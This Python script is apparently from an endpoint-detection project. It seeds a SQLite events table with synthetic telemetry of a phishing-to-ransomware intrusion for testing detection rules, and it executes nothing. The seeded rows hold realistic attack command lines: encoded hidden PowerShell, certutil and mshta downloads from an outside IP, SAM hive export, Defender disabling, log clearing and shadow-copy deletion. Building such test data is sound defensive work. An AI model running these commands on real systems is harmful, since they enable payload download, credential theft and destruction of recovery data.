"""
Seeds a synthetic intrusion into the events table so the detection
engine, attack chains and process trees have something to work on.

Why this exists: Phase 1's collectors faithfully record a normal
machine doing normal things, which is exactly what a detection rule is
built *not* to fire on. Without a way to produce malicious-looking
telemetry, the only way to see Phase 2/3 work would be to actually run
malware on the host. This writes the events such an intrusion would
leave behind — no payload, nothing executed, just rows in SQLite.

The scenario is a conventional phishing-to-ransomware chain, ordered
the way one really unfolds, with the parent/child links intact so the
process tree reconstructs it:

    explorer.exe
      outlook.exe
        winword.exe            malicious document opened
          cmd.exe              macro drops to a shell
            powershell.exe     encoded, hidden-window stage two
              certutil.exe     payload download
              svchost.exe      dropped binary masquerading as a system process
                whoami/net/ipconfig/systeminfo/nltest   host discovery
              reg.exe          credential theft from the SAM hive
              powershell.exe   Defender disabled, task scheduled
              psexec.exe       lateral movement
              wevtutil.exe     logs cleared
              vssadmin.exe     shadow copies deleted

plus authentication failures, a privileged logon, a USB insertion with
execution from it, and C2 network traffic.

Usage:
    python scripts/seed_demo_attack.py           # seed
    python scripts/seed_demo_attack.py --reset   # remove it again

Every row is tagged `"demo": true` inside its details blob, which is
what --reset keys on — so it can be removed cleanly without touching a
single real event the collectors recorded.
"""

import argparse
import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.db.database import connection, init_db  # noqa: E402

# Well clear of any pid Windows will hand out, so a seeded process can
# never be confused with — or adopted into the tree of — a real one.
PID_BASE = 900_000

USER = "WORKSTATION\\j.hale"
ATTACKER_IP = "185.220.101.47"


class Scenario:
    """Collects events with timestamps relative to a single start point.

    Each `at` is seconds into the intrusion, so the scenario reads as a
    timeline in source order and the whole thing can be anchored to
    "ending a few minutes ago" without rewriting every timestamp.
    """

    def __init__(self, start: datetime):
        self.start = start
        self.rows: list[tuple] = []

    def _ts(self, at: float) -> str:
        return (self.start + timedelta(seconds=at)).isoformat(timespec="milliseconds")

    def _add(self, at, event_type, *, process_name=None, parent_process=None,
             pid=None, parent_pid=None, user=None, details=None):
        payload = {"demo": True, **(details or {})}
        self.rows.append(
            (self._ts(at), event_type, process_name, parent_process, pid, parent_pid,
             user, "Information", json.dumps(payload))
        )

    def process(self, at, name, pid, ppid, parent_name, *, cmdline=None, path=None,
                user=USER):
        self._add(
            at, "process_creation", process_name=name, parent_process=parent_name,
            pid=PID_BASE + pid, parent_pid=PID_BASE + ppid if ppid else None, user=user,
            details={
                "parent_pid": PID_BASE + ppid if ppid else None,
                "executable_path": path or f"C:\\Windows\\System32\\{name}",
                "command_line": cmdline or name,
            },
        )

    def exited(self, at, name, pid, *, user=USER):
        self._add(at, "process_termination", process_name=name, pid=PID_BASE + pid,
                  user=user, details={"exit_status": 0})

    def connection(self, at, name, pid, remote_addr, remote_port, local_port=49000):
        self._add(
            at, "network_connection", process_name=name, pid=PID_BASE + pid,
            details={
                "local_addr": "192.168.1.42", "local_port": local_port,
                "remote_addr": remote_addr, "remote_port": remote_port,
                "status": "ESTABLISHED",
            },
        )

    def usb(self, at, event_type, drive):
        self._add(at, event_type, details={"drive": drive})

    def failed_logon(self, at, user, reason="0xc000006a"):
        self._add(
            at, "logon_failed", user=user,
            details={
                "logon_type": "3", "logon_type_label": "Network",
                "source_address": ATTACKER_IP, "workstation": "KALI",
                "status_code": reason, "failure_reason": "Wrong password",
            },
        )

    def special_logon(self, at, user):
        self._add(
            at, "special_logon", user=user,
            details={"logon_id": "0x3e7a91", "privileges": "SeDebugPrivilege, SeTcbPrivilege"},
        )


def build_scenario(start: datetime) -> Scenario:
    s = Scenario(start)

    # --- Initial access: a document arrives and is opened -------------
    s.process(0, "explorer.exe", 10, 0, None, path="C:\\Windows\\explorer.exe")
    s.process(5, "outlook.exe", 20, 10, "explorer.exe",
              path="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")
    s.process(42, "winword.exe", 30, 20, "outlook.exe",
              path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              cmdline='"WINWORD.EXE" /n "C:\\Users\\j.hale\\Downloads\\Invoice_Q3_2026.docm"')

    # --- Execution: the macro runs ------------------------------------
    # EDR-001: a document reader spawning a shell.
    s.process(58, "cmd.exe", 40, 30, "winword.exe",
              cmdline='cmd.exe /c powershell -w hidden -nop -enc '
                      'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A')
    # EDR-002: encoded PowerShell with concealment flags.
    s.process(59, "powershell.exe", 50, 40, "cmd.exe",
              path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              cmdline='powershell.exe -w hidden -nop -noni -enc '
                      'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A'
                      'LgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=')
    s.exited(61, "cmd.exe", 40)

    # --- Command and control -----------------------------------------
    # EDR-015 (interpreter to external host) and EDR-016 (tooling port).
    s.connection(64, "powershell.exe", 50, ATTACKER_IP, 4444)
    s.connection(70, "powershell.exe", 50, ATTACKER_IP, 443, local_port=49231)

    # EDR-003: payload fetched with a signed Microsoft utility.
    s.process(78, "certutil.exe", 60, 50, "powershell.exe",
              cmdline='certutil.exe -urlcache -split -f '
                      'http://185.220.101.47/update.bin C:\\Users\\Public\\svchost.exe')
    s.exited(81, "certutil.exe", 60)

    # EDR-004: remotely hosted script via a proxy-execution binary.
    s.process(86, "mshta.exe", 65, 50, "powershell.exe",
              cmdline='mshta.exe http://185.220.101.47/p.hta')

    # EDR-011 + EDR-012 + EDR-013: the dropped binary runs from a
    # user-writable path, wearing a system binary's name, with a parent
    # that is not services.exe.
    s.process(94, "svchost.exe", 70, 50, "powershell.exe",
              path="C:\\Users\\Public\\svchost.exe",
              cmdline="C:\\Users\\Public\\svchost.exe -k netsvcs")

    # --- Discovery ----------------------------------------------------
    # EDR-014 fires once the fourth distinct tool appears.
    for offset, (tool, args) in enumerate(
        [
            ("whoami.exe", "whoami.exe /all"),
            ("net.exe", "net.exe group \"Domain Admins\" /domain"),
            ("ipconfig.exe", "ipconfig.exe /all"),
            ("systeminfo.exe", "systeminfo.exe"),
            ("nltest.exe", "nltest.exe /domain_trusts /all_trusts"),
            ("tasklist.exe", "tasklist.exe /svc"),
        ]
    ):
        s.process(104 + offset * 7, tool, 80 + offset, 70, "svchost.exe", cmdline=args)
        s.exited(106 + offset * 7, tool, 80 + offset)

    # --- Credential access --------------------------------------------
    # EDR-007: registry hive export.
    s.process(152, "reg.exe", 90, 50, "powershell.exe",
              cmdline="reg.exe save hklm\\sam C:\\Users\\Public\\sam.hiv")
    s.process(156, "reg.exe", 91, 50, "powershell.exe",
              cmdline="reg.exe save hklm\\system C:\\Users\\Public\\system.hiv")

    # --- Defense evasion ----------------------------------------------
    # EDR-006: real-time protection off, exclusion added.
    s.process(168, "powershell.exe", 100, 50, "powershell.exe",
              path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              cmdline="powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true; "
                      "Add-MpPreference -ExclusionPath C:\\Users\\Public")

    # --- Persistence ---------------------------------------------------
    # EDR-009: scheduled task pointing at the dropped binary.
    s.process(181, "schtasks.exe", 110, 50, "powershell.exe",
              cmdline='schtasks.exe /create /tn "MicrosoftEdgeUpdateTaskCore" /tr '
                      '"C:\\Users\\Public\\svchost.exe" /sc onlogon /ru SYSTEM')

    # --- Privilege escalation -------------------------------------------
    # EDR-019: the session picks up administrative privileges.
    s.special_logon(188, USER)

    # --- Credential access, continued: spraying the network -------------
    # EDR-018: a run of failures against one account.
    for i in range(7):
        s.failed_logon(196 + i * 3, "WORKSTATION\\administrator")

    # --- Discovery: scanning for the next host ---------------------------
    # EDR-017: many distinct destinations from one process.
    for i in range(22):
        s.connection(222 + i, "svchost.exe", 70, f"192.168.1.{20 + i}", 445,
                     local_port=50100 + i)

    # --- Lateral movement -------------------------------------------------
    # EDR-010: remote execution tooling.
    s.process(252, "psexec.exe", 120, 50, "powershell.exe",
              path="C:\\Users\\Public\\psexec.exe",
              cmdline='psexec.exe \\\\192.168.1.31 -u administrator -p Summer2026! '
                      '-s cmd.exe /c "C:\\Users\\Public\\svchost.exe"')

    # --- Removable media ---------------------------------------------------
    # EDR-020, then EDR-021 when something runs from the mounted drive.
    s.usb(262, "usb_insert", "E:")
    s.process(270, "collect.exe", 130, 50, "powershell.exe",
              path="E:\\tools\\collect.exe", cmdline="E:\\tools\\collect.exe /harvest")

    # --- Impact -------------------------------------------------------------
    # EDR-008: the audit trail goes first.
    s.process(286, "wevtutil.exe", 140, 50, "powershell.exe",
              cmdline="wevtutil.exe cl Security")
    # EDR-005: then recovery is removed, the ransomware precondition.
    s.process(292, "vssadmin.exe", 150, 50, "powershell.exe",
              cmdline="vssadmin.exe delete shadows /all /quiet")
    s.process(297, "bcdedit.exe", 151, 50, "powershell.exe",
              cmdline="bcdedit.exe /set {default} recoveryenabled no")

    return s


def seed() -> int:
    init_db()
    # Ends two minutes ago, so every row is inside the dashboard's
    # "last 24h" window and reads as something that just happened.
    start = datetime.now(timezone.utc) - timedelta(seconds=300 + 120)
    scenario = build_scenario(start)

    with connection() as conn:
        conn.executemany(
            """INSERT INTO events
                 (timestamp, event_type, process_name, parent_process, pid, parent_pid,
                  user, severity, details)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            scenario.rows,
        )
    return len(scenario.rows)


def reset() -> dict:
    """Remove the seeded intrusion and everything derived from it.

    Order matters: alerts are deleted while their events still exist,
    because alerts.event_id is ON DELETE SET NULL — drop the events
    first and there is no longer any way to tell which alerts were
    demo alerts.
    """
    with connection() as conn:
        demo_ids = [
            r["id"]
            for r in conn.execute(
                "SELECT id FROM events WHERE json_extract(details, '$.demo') = 1"
            )
        ]

        alerts = 0
        if demo_ids:
            placeholders = ",".join("?" * len(demo_ids))
            alerts = conn.execute(
                f"DELETE FROM alerts WHERE event_id IN ({placeholders})", demo_ids
            ).rowcount
            conn.execute(f"DELETE FROM events WHERE id IN ({placeholders})", demo_ids)

        incidents = conn.execute(
            """DELETE FROM incidents
                WHERE id NOT IN (SELECT incident_id FROM alerts WHERE incident_id IS NOT NULL)"""
        ).rowcount

        return {"events": len(demo_ids), "alerts": alerts, "incidents": incidents}


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--reset", action="store_true", help="remove previously seeded demo data")
    args = parser.parse_args()

    if args.reset:
        removed = reset()
        print(
            f"Removed {removed['events']} demo events, {removed['alerts']} alerts, "
            f"{removed['incidents']} incidents."
        )
    else:
        count = seed()
        print(
            f"Seeded {count} demo events. The detection engine will pick them up on its "
            f"next poll (within a couple of seconds if the API is running)."
        )
